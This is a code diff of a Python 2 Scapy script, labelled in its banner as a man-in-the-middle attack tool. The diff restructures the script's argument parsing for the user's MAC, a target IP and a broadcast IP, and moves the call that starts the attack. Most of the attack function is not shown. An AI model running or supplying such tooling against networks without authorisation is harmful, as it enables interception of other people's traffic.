@@ -3,6 +3,19 @@
 from scapy.all import *
 import time, sys
 
+try:
+	print "#################################################"
+	print "##    Man In The Middle with Scapy by Skyper   ##"
+	print "##           http://blog.skyplabs.net          ##"
+	print "#################################################"
+	
+	MyMAC = sys.argv[1]
+	targetIP = sys.argv[2]
+	broadcastIP = sys.argv[3]
+except:
+	print "Usage: " + sys.argv[0] + " <Your MAC> <Target's IP> <Broadcast IP>"
+	sys.exit(1)
+
 def mitm(MyMAC, targetIP, broadcastIP, interval=15):
 	"""Man In The Middle attack"""
 	try:
@@ -14,17 +27,6 @@ def mitm(MyMAC, targetIP, broadcastIP, interval=15):
 		print ""
 		print "[*] Stopping attack"
 
-try:
-	print "#################################################"
-	print "##    Man In The Middle with Scapy by Skyper   ##"
-	print "##           http://blog.skyplabs.net          ##"
-	print "#################################################"
-	
-	MyMAC = sys.argv[1]
-	targetIP = sys.argv[2]
-	broadcastIP = sys.argv[3]
 
-	print "[*] Starting attack ..."
-	mitm(MyMAC, targetIP, broadcastIP)
-except:
-	print "Usage: " + sys.argv[0] + " <Your MAC> <Target's IP> <Broadcast IP>"
+print "[*] Starting attack ..."
+mitm(MyMAC, targetIP, broadcastIP)
